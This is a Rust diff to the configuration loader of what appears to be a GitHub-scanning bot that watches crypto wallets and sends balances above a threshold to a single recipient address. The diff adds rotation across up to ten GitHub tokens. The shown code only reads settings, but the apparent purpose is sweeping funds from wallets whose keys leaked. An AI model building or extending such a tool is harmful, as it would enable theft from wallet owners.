@@ -3,7 +3,7 @@ use thiserror::Error;
 
 #[derive(Debug, Clone)]
 pub struct Config {
-    pub github_token: Option<String>,
+    pub github_tokens: Vec<String>,
     pub github_api_url: String,
     pub telegram_bot_token: String,
     pub telegram_chat_id: String,
@@ -23,60 +23,82 @@ pub struct Config {
 pub enum ConfigError {
     #[error("Missing required environment variable: {0}")]
     MissingEnv(String),
-    
+
     #[error("Invalid value for environment variable {0}: {1}")]
     InvalidValue(String, String),
 }
 
 impl Config {
     pub fn from_env() -> Result<Self, ConfigError> {
+        // Tokens collect karo
+        let mut tokens = Vec::new();
+
+        // Legacy single token
+        if let Ok(token) = env::var("GITHUB_TOKEN") {
+            if !token.is_empty() {
+                tokens.push(token);
+            }
+        }
+
+        // Multiple tokens: GITHUB_TOKEN_1, GITHUB_TOKEN_2, ...
+        for i in 1..=10 {
+            let key = format!("GITHUB_TOKEN_{}", i);
+            if let Ok(token) = env::var(&key) {
+                if !token.is_empty() {
+                    tokens.push(token);
+                }
+            }
+        }
+
+        // Deduplicate
+        tokens.sort();
+        tokens.dedup();
+
         Ok(Self {
-            github_token: env::var("GITHUB_TOKEN").ok(),
-            
+            github_tokens: tokens,
+
             github_api_url: env::var("GITHUB_API_URL")
                 .unwrap_or_else(|_| "https://api.github.com".to_string()),
-            
+
             telegram_bot_token: env::var("TELEGRAM_BOT_TOKEN")
                 .unwrap_or_default(),
-            
+
             telegram_chat_id: env::var("TELEGRAM_CHAT_ID")
                 .unwrap_or_else(|_| "0".to_string()),
-            
+
             mongodb_uri: env::var("MONGODB_URI")
                 .unwrap_or_else(|_| "mongodb://localhost:27017".to_string()),
-            
             mongodb_db: env::var("MONGODB_DB")
                 .unwrap_or_else(|_| "git_scanner".to_string()),
-            
             mongodb_collection: env::var("MONGODB_COLLECTION")
                 .unwrap_or_else(|_| "monitored_wallets".to_string()),
-            
+
             recipient_address: env::var("RECIPIENT_ADDRESS")
                 .unwrap_or_default(),
-            
+
             rpc_url: env::var("RPC_URL")
                 .unwrap_or_else(|_| "https://eth-mainnet.g.alchemy.com/v2/demo".to_string()),
-            
+
             chain_id: env::var("CHAIN_ID")
                 .unwrap_or_else(|_| "1".to_string())
                 .parse::<u64>()
                 .map_err(|e: std::num::ParseIntError| ConfigError::InvalidValue("CHAIN_ID".to_string(), e.to_string()))?,
-            
+
             poll_interval_secs: env::var("POLL_INTERVAL_SECONDS")
-                .unwrap_or_else(|_| "3".to_string())
+                .unwrap_or_else(|_| "5".to_string())
                 .parse::<u64>()
                 .map_err(|e: std::num::ParseIntError| ConfigError::InvalidValue("POLL_INTERVAL_SECONDS".to_string(), e.to_string()))?,
-            
+
             min_balance_threshold: env::var("MIN_BALANCE_THRESHOLD")
                 .unwrap_or_else(|_| "0.0001".to_string())
                 .parse::<f64>()
                 .map_err(|e: std::num::ParseFloatError| ConfigError::InvalidValue("MIN_BALANCE_THRESHOLD".to_string(), e.to_string()))?,
-            
+
             gas_limit: env::var("GAS_LIMIT")
                 .unwrap_or_else(|_| "21000".to_string())
                 .parse::<u64>()
                 .map_err(|e: std::num::ParseIntError| ConfigError::InvalidValue("GAS_LIMIT".to_string(), e.to_string()))?,
-            
+
             gas_price_gwei: env::var("GAS_PRICE_GWEI")
                 .unwrap_or_else(|_| "50".to_string())
                 .parse::<u64>()
